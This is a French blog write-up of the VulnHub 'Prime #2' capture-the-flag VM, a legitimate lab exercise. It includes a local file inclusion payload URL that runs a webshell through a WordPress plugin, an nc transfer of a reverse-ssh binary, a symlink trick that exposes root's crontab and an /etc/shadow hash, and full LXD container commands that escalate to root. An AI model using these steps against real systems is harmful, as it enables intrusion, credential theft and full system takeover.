# Solution du CTF Prime #2 de VulnHub

Faux départ
-----------

[Prime #2](https://www.vulnhub.com/entry/prime-2021-2,696/) est un CTF créé par [Suraj](https://twitter.com/hackerctf) et disponible sur VulnHub.  

Un premier scan de ports renvoi des réponses ICMP bizarres comme quoi le protocole n'est pas supporté. Hmmm.  

Pour savoir quels protocoles sont supportés par une machine distante on peut utiliser [un vieux code C que j'ai écrit il y a plus de 10 ans](http://devloop.users.sourceforge.net/index.php?article63/protoscan) ou plus facilement avec l'option *-sO* de Nmap.  

```plain
$ sudo nmap -sO 192.168.56.2 
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for 192.168.56.2
Host is up (0.000024s latency).
Not shown: 254 closed n/a protocols (proto-unreach)
PROTOCOL STATE SERVICE
1        open  icmp
17       open  udp
MAC Address: 08:00:27:86:EA:5C (Oracle VirtualBox virtual NIC)
```

Etant donné qu'aucun port ne ressort non plus d'un scan UDP il est à parier que la VM ne fonctionne pas sous VirtualBox.  

Un import dans VMWare et un scan de port plus tard valident cette hypothèse :  

```plain
Nmap scan report for 192.168.101.128
Host is up (0.0014s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.4p1 Ubuntu 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0a:16:3f:c8:1a:7d:ff:f5:7a:66:05:63:76:7c:5a:95 (RSA)
|   256 7f:47:44:cc:d1:c4:b7:54:de:4f:27:f2:39:38:ff:6e (ECDSA)
|_  256 f5:d3:36:44:43:40:3d:11:9b:d1:a6:24:9f:99:93:f7 (ED25519)
80/tcp    open  http        Apache httpd 2.4.46 ((Ubuntu))
|_http-server-header: Apache/2.4.46 (Ubuntu)
|_http-title: HackerCTF
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10123/tcp open  http        SimpleHTTPServer 0.6 (Python 3.9.4)
|_http-server-header: SimpleHTTP/0.6 Python/3.9.4
|_http-title: Directory listing for /
MAC Address: 00:0C:29:0C:F0:56 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Essayons de voir ce qui est disponible sur le Samba avec SMBmap :  

```plain
$ python smbmap.py -H 192.168.101.128

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com   
                     https://github.com/ShawnDEvans/smbmap

[!] Authentication error on 192.168.101.128
```

J'ai le bon réflexe d'essayer avec smbclient qui lui fonctionne correctement :  

```plain
$ smbclient -U "" -N -L //192.168.101.128

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        welcome         Disk      Welcome to Hackerctf LAB
        IPC$            IPC       IPC Service (hackerctflab server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

Une tentative d'accès au partage $print renvoie une erreur NT\_STATUS\_ACCESS\_DENIED mais le disque *welcome* est (évidemment) plus accueillant :  

```plain
smb: \> ls
  .                                   D        0  Sat May  8 09:42:49 2021
  ..                                  D        0  Fri May  7 20:38:58 2021
  .mysql_history                      H       18  Sat May  8 09:05:03 2021
  .profile                            H      807  Fri Mar 19 17:02:58 2021
  upload                              D        0  Sun May  9 13:19:02 2021
  .sudo_as_admin_successful           H        0  Sat May  8 07:34:48 2021
  .bash_logout                        H      220  Fri Mar 19 17:02:58 2021
  .cache                             DH        0  Fri May  7 20:39:15 2021
  something                           N       82  Fri May  7 18:18:09 2021
  secrets                             N        0  Fri May  7 18:15:17 2021
  .bash_history                       H       72  Sun May  9 13:23:26 2021
  .bashrc                             H     3771  Fri Mar 19 17:02:58 2021
```

Avec, en ordre d'apparition, dans l'historique bash :  

```plain
sudo su -
ifconfig
ls
cd upload/
ls
ls -l
cd ..
ls -l
chmod 755 jarves/
```

et dans le fichier *something* :  

```plain
I wanted to make it my home directory. But idea must be changed.

Thanks,
jarves
```

Le fichier *secrets* ne révèle aucun secret... puisqu'il est vide !  

Le dossier *upload* contient un fichier *shell.php* dont le contenu est raccord au nom (appel à la fonction *system()* de PHP).  

Sur le port 10123 tourne le serveur HTTP builtin de Python (*python3 -m http.server*) qui partage exactement le même dossier.  

Le serveur 80 ne correspond pas au même path, ce serait trop facile avec un shell qui nous attend.  

Pour obtenir un shell sur la machine il y a deux chemins. Voici le premier qui a le mérite d'exister comme on verra par la suite.  

Comme le H de Hawaï
-------------------

Via une énumération je trouve un Wordpress installé à l'URL *http://192.168.101.128/wp/*.  

Il y a aussi un CMS Gila que l'auteur a visiblement essayé d'installer sans succès (retourne un code d'erreur 500) sous la racine */server*.  

Je passe donc sur WPscan :  

```plain
$ docker run -it --rm wpscanteam/wpscan --url http://192.168.101.128/wp/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://192.168.101.128/wp/ [192.168.101.128]
[+] Started: Mon Dec 13 08:24:53 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.46 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.101.128/wp/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.101.128/wp/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.101.128/wp/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.101.128/wp/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.8 identified (Insecure, released on 2021-07-20).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.101.128/wp/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.8'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.101.128/wp/, Match: 'WordPress 5.8'

[+] WordPress theme in use: twentytwentyone
 | Location: http://192.168.101.128/wp/wp-content/themes/twentytwentyone/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://192.168.101.128/wp/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | Style URL: http://192.168.101.128/wp/wp-content/themes/twentytwentyone/style.css?ver=1.3
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.101.128/wp/wp-content/themes/twentytwentyone/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] gracemedia-media-player
 | Location: http://192.168.101.128/wp/wp-content/plugins/gracemedia-media-player/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2013-07-21T15:09:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.101.128/wp/wp-content/plugins/gracemedia-media-player/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.101.128/wp/wp-content/plugins/gracemedia-media-player/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <===================================================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.
```

Il y a un plugin baptisé *gracemedia* en version 1.0. Il s'agit de la dernière version mais il n'en reste pas moins qu'elle est vulnérable [à une faille d'inclusion locale](https://www.exploit-db.com/exploits/46537).

On peut en profiter pour faire exécuter ce fameux shell :  

```plain
/wp/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../home/jarves/upload/shell.php&cmd=id
```

D'après l'output le fichier est inclus à deux reprises :  

```plain
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Je souhaiterais bien rapatrier un reverse shell mais le trafic sortant semble en partie filtré.  

Cela est validé avec le netcat présent sur la VM qui ne semble laisser passer que SSH :  

```plain
$ nc -zv 192.168.101.1 1-500 -w 1
--- snip ---
nc: connect to 192.168.101.1 port 21 (tcp) timed out: Operation now in progress
Connection to 192.168.101.1 22 port [tcp/ssh] succeeded!
--- snip ---
```

Le trafic entrant n'a pas ce type de restrictions alors il suffit de mettre en port en écoute et une redirection :  

```bash
$ nc -l -p 9999 > /tmp/reverse-sshx64
```

et on envoi la sauce :  

```bash
$ ncat 192.168.101.128 9999 -v < /tmp/reverse-sshx64
```

Il ne reste plus qu'à se connecter avec SSH sur le port 31337 et le password par défaut de [reverse-ssh](https://github.com/Fahrj/reverse-ssh).  

This is the way
---------------

Mais la façon attendue d'obtenir le shell c'est visiblement de profiter que le partage SMB est en écriture.  

Il ne faudra pas longtemps pour créer le dossier *.ssh* et y déposer un fichier *authorized\_keys*.  

Une particularité sur ce CTF est que selon le chemin employé (via le webshell ou via SMB) le dossier */tmp* contient un contenu différent. Vraisemblablement une réglage de systemd que j'ai déjà croisé par le passé.  

On obtient alors notre shell pour l'utilisateur *jarves* membre des groupes sudo et lxd.  

```plain
uid=1000(jarves) gid=1000(jarves) groups=1000(jarves),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
```

On ne dispose pas du mot de passe de l'utilisateur et ce dernier n'est pas présent dans la base MySQL locale ou ailleurs sur le système.  

*LinPEAS* indique que le système est peut être vulnérable à la faille sudo *Baron Samedit* mais l'exploit me dit explicitement que la version est patchée.  

On remarque que certains process sont lancés via le démon CRON :  

```plain
root         838  0.0  0.0   6884  3116 ?        Ss   08:50   0:00 /usr/sbin/cron -f -P
root        1168  0.0  0.0   8412  3500 ?        S    08:51   0:00  _ /usr/sbin/CRON -f -P
root        1171  0.0  0.0   2628   780 ?        Ss   08:51   0:00  |   _ /bin/sh -c bash /root/service
root        1175  0.0  0.0   7124  3372 ?        S    08:51   0:00  |       _ bash /root/service
root        1178  0.0  0.5 714868 20432 ?        S    08:51   0:05  |           _ python3 -m http.server -d /home/jarves 10123
root        8867  0.0  0.0   8412  3588 ?        S    11:45   0:00  _ /usr/sbin/CRON -f -P
root        8871  0.0  0.0   2628   780 ?        Ss   11:45   0:00      _ /bin/sh -c /usr/bin/python3  /usr/lib/hackerctf/sigma32.py
root        8874  0.1  0.2  16280  9196 ?        S    11:45   0:00          _ /usr/bin/python3 /usr/lib/hackerctf/sigma32.py
```

Détail amusant, le serveur web de Python est exécuté en root et livre un dossier sur lequel on a le contrôle. C'est l'occasion de tester un petit lien symbolique histoire de voir si Python le suit.  

```bash
$ ln -s / disk
```

Et effectivement c'est le cas !  

Je peux par exemple lire la contab de root à l'adresse *http://192.168.101.128:10123/disk/var/spool/cron/crontabs/root* :  

```plain
# m h  dom mon dow   command
*2/ *   * * *   /usr/bin/python3  /usr/lib/hackerctf/sigma32.py
*1/ *   * * *   bash /root/shell
*1/ *   * * *   bash /root/service
```

J'ai aussi accès au contenu du fichir */etc/shadow* :  

```plain
jarves:$6$bh9b6tMU.UIAzSq6$m6KFceXgSBAI/lnyIXVJK3t.5MnTRbU8zna08doU0OED53FgvXLo6vIzovX2TdXHPMPMAMtUFIZKAuriKfWCo1:18755:0:99999:7:::
```

Malheureusement il a l'air assez solide.  

Il ne reste qu'à procéder à une escalade de provilège par LXC. Je me suis inspiré [d'un article](https://www.hackingarticles.in/lxd-privilege-escalation/) mais en évitant l'étape où l'on doit faire exécuter un script en root sur sa machine personnelle.  

Le principe est similaire à une escalade via Docker : on va créer un container sur lequel on monte le disque hôte. On en profite pour placer notre clé publique SSH comme clé autorisée pour root :  

```plain
jarves@hackerctflab:~$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 
Do you want to configure a new storage pool? (yes/no) [default=yes]: 
Name of the new storage pool [default=default]: 
Name of the storage backend to use (dir, lvm, ceph, btrfs) [default=btrfs]: dir
Would you like to connect to a MAAS server? (yes/no) [default=no]: 
Would you like to create a new local network bridge? (yes/no) [default=yes]: 
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
Would you like the LXD server to be available over the network? (yes/no) [default=no]: 
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
jarves@hackerctflab:~$ lxc list
To start your first instance, try: lxc launch ubuntu:18.04

+------+-------+------+------+------+-----------+
| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |
+------+-------+------+------+------+-----------+

jarves@hackerctflab:~$ lxc launch ubuntu:18.04
Creating the instance
Instance name is: cosmic-polecat            
Starting cosmic-polecat

jarves@hackerctflab:~$ lxc image list
+-------+--------------+--------+---------------------------------------------+--------------+-----------+----------+-------------------------------+
| ALIAS | FINGERPRINT  | PUBLIC |                 DESCRIPTION                 | ARCHITECTURE |   TYPE    |   SIZE   |          UPLOAD DATE          |
+-------+--------------+--------+---------------------------------------------+--------------+-----------+----------+-------------------------------+
|       | 62b292b5a57e | no     | ubuntu 18.04 LTS amd64 (release) (20211129) | x86_64       | CONTAINER | 194.36MB | Dec 13, 2021 at 12:56pm (UTC) |
+-------+--------------+--------+---------------------------------------------+--------------+-----------+----------+-------------------------------+

jarves@hackerctflab:~$ lxc image alias create yolo 62b292b5a57e
jarves@hackerctflab:~$ lxc image list
+-------+--------------+--------+---------------------------------------------+--------------+-----------+----------+-------------------------------+
| ALIAS | FINGERPRINT  | PUBLIC |                 DESCRIPTION                 | ARCHITECTURE |   TYPE    |   SIZE   |          UPLOAD DATE          |
+-------+--------------+--------+---------------------------------------------+--------------+-----------+----------+-------------------------------+
| yolo  | 62b292b5a57e | no     | ubuntu 18.04 LTS amd64 (release) (20211129) | x86_64       | CONTAINER | 194.36MB | Dec 13, 2021 at 12:56pm (UTC) |
+-------+--------------+--------+---------------------------------------------+--------------+-----------+----------+-------------------------------+

jarves@hackerctflab:~$ lxc init yolo ignite -c security.privileged=true
Creating ignite

jarves@hackerctflab:~$ lxc config device add ignite host-root disk source=/ path=/mnt/root recursive=true
Device host-root added to ignite
jarves@hackerctflab:~$ lxc start ignite
jarves@hackerctflab:~$ lxc exec ignite /bin/sh
# cd /mnt/root/root
# ls -a
.  ..  .bash_history  .bashrc  .cache  .config  .local  .mysql_history  .profile  .python_history  .selected_editor  .ssh  auto.py  data.zip  service  shell  shell32  snap  wp.sql
# cd .ssh
# cp ../../home/jarves/.ssh/authorized_keys .
```

```plain
$ ssh root@192.168.1.5
Enter passphrase for key '/home/devloop/.ssh/id_rsa': 

root@hackerctflab:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Un CTF un peu chaotique où l'on se demande parfois si son auteur savait ce qu'il faisait...

*Published December 13 2021 at 18:11*